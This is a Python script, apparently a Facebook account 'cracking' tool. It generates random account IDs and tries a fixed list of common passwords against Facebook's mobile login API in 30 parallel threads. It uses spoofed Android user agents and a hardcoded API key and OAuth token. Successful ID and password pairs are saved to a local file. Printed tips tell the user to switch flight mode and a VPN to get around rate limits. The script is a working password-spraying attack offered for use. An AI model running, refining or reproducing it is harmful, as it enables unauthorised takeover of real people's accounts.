#OWNER OF SYTHE ADMIN
import os
import sys
import random
import string
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
import os,sys,re,time,json
import requests,bs4,string
import faker,random
from faker import Faker
from bs4 import BeautifulSoup
try:
    import rich, requests
except:
    os.system(" pip install rich requests ")
    import rich, requests
from rich import print 
from rich.tree import Tree
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console
from rich.console import Group
from rich.align import Align
from rich.syntax import Syntax
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from bs4 import BeautifulSoup as sop
from datetime import datetime
from time import sleep as slp
#++++++++++++++COLORS+++++++++++++#
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
S = '\033[96;1m'
N = '\x1b[0m'
M ='\033[90m'
T ='\033[95m'
P = '\033[95;1m'
C='\033[3m'
E = '\033[1;35m'
H ='\033[0;33m'
V= '\033[1;32m'
X= '\033[1;34m'
RED = '\033[92;1m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
PURPLE ='\x1b[38;5;46m'
BLACK="\033[1;30m"
GREY ='\033[90m'
MAGENTA ='\033[95m'
EXTRA ='\x1b[38;5;208m'
CGREEN= '\033[3m'
DYELLOW= '\033[0;33m'
DGREEN = '\033[1;32m'
DBLUE ='\033[1;34m'

user = []
oks = []
cps = []
loop = 0

#USER AGENT CODE BY GPT#
def generate_android_user_agent():
    rr = random.randint
    android_version = f"{rr(7, 13)}.{rr(0, 9)}"  
    device_model = random.choice(["Nokia 6.1", "Samsung Galaxy S9", "Pixel 4a", "OnePlus 7T"])  # Random device models
    build_id = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))  # Random Build ID
    chrome_version = f"{rr(80, 100)}.0.{rr(4000, 5000)}.{rr(0, 150)}"  
    safari_version = "537.36"

    user_agent = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {device_model} Build/{build_id}; wv) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) Version/4.0 "
        f"Chrome/{chrome_version} Mobile Safari/{safari_version}"
    )
    return user_agent

#USER AGENT CODE BY GPT#
def generate_firefox_user_agent():
    rr = random.randint
    rv_version = rr(30, 60)  
    win_version = random.choice(['6.1', '6.0', '5.1', '5.0'])  
    gecko_date = f"{rr(2000, 2020)}{str(rr(1, 12)).zfill(2)}{str(rr(1, 28)).zfill(2)}"  
    
    
    user_agent = f"Mozilla/5.0 (Windows NT {win_version}; WOW64; rv:{rv_version}.0) Gecko/{gecko_date} Firefox/{rv_version}.0"
    return user_agent

def generate_firefox_user_agent7():
    
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def linex():
    print("-" * 50)

def ____banner____():
    print(f"""





░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░
██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░
██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗
╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░""")
def banner():
    os.system("clear")
    print(Panel(logo,subtitle="[bold red]● [bright_yellow]● [green1]●",subtitle_align='left',title="[bold red]● [bright_yellow]● [green1]●",title_align='right',width=102,padding=0,style="bold violet"))
    print(Panel(hx,width=100,padding=0,style="bold green"))
def menu():
    clear()
    ____banner____()
    linex()
    print(f"[1] OLD CRACK ")
    print(f"[0] Exit")
    linex()
    fuck = input(f'[+] INPUT : ')
    if fuck == "1":
        Crack_xnxx()
    elif fuck == "0":
        pass	

def Crack_xnxx():
    clear()
    ____banner____()
    linex()
    print(f'[+] EXAMPLE : {R}3000/5000/10000/99999')
    linex()
    limit = int(input(f' {S} [•] {G} CHOICE  : '))   
    clear()
    for a in range(limit):
        AXN = "".join(random.choice(string.digits) for _ in range(9))
        user.append(AXN)

    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ____banner____()
        linex()
        print(" [📌] TOTAL IDS - " + str(len(user)))
        print(" [📌] USE FLIGHT MODE EVERY 3 MIN")
        print(" [📌] USE 1.1.1.1 VPN FOR GOOD RESULT")
        print(" [📌] Take note : this crack tools is working  100% BUT  Some accounts are Ban on your devices ( Please be patient and take on your RISK ) ")
        linex()
        for love in user:
            ids = str("100000" + love)
            passlist = ["123456", "123456789"," 1234567", "12345678", "776890", "528300"]
            Fuck_xnxx.submit(Mathod_fuck, ids, passlist)
    
    sys.exit("\n-------------------------------")

def Mathod_fuck(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\rCOUNT [{loop}] | COMPLETE: [{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
                'adid': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'cpl': 'true',
                'credentials_type': 'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "locale": "en_US",
                "client_country_code": "US",
                "device_id": str(uuid.uuid4()),
                "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
            }
            head = {
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': generate_android_user_agent(),
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }
            url = "https://b-graph.facebook.com/auth/login"
            response = requests.post(url, data=data, headers=head, verify=True).json()
            if "access_token" in response:
                print(f"\r\CRACKING  | {G}[ EMAIL ]{ids} • {R} [ PASSWORD] {pas}")
                with open("AXN-OK.txt", "a") as f:
                    f.write(ids + "|" + pas + "\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"\r\CRACKING  | {G}[ EMAIL ]{ids} • {R} [ PASSWORD] {pas}")
                with open("AXN-OK.txt", "a") as f:
                    f.write(ids + "|" + pas + "\n")
                cps.append(ids)
                break
        loop += 1
    except Exception as e:
        pass

if __name__ == "__main__":
    menu()